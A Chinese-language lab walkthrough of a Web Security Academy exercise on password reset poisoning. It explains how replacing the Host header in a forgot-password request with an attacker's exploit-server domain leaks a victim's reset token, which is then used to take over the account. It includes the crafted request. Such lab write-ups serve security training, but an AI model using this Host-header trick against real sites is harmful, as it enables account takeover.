# LAB：基础密码重置中毒

##### 漏洞描述：

由于在密码重置时发送给用户的动态URL是根据可控输入的（Host标头），所以我们就可以把host标头改成我们自己的域名，让其发送给目标用户，由于域名指向的是我们的服务器，所以当用户点击的时候，密码重置的唯一token就会发送到我们的服务器。

##### 题目描述：

该LAB容易受到密码重置中毒攻击。

##### 解决方案：

首先我们可以通过自己的账号来测试，重置密码的具体流程：

网站会给我们的浏览器发送一个重置密码的网址，里面包含唯一token：

```
https://0a0700e10395b914801f035500cf0061.web-security-academy.net/forgot-password?temp-forgot-password-token=tczvf3bcnwrt136yg13oz6ojb8ijj2nd
```

我们记住这个网址。

然后，我们通过忘记密码来拦截carlos的密码重置请求：

```
POST /forgot-password HTTP/2
Host: exploit-0a35007a038ab97380ea025d0117009e.exploit-server.net/exploit
```

如上，把host改成我们自己的域名，查看域名的日志，收到了唯一token，根据我们之前记录的网址，把token改成carlos的token,就可以重置密码了。



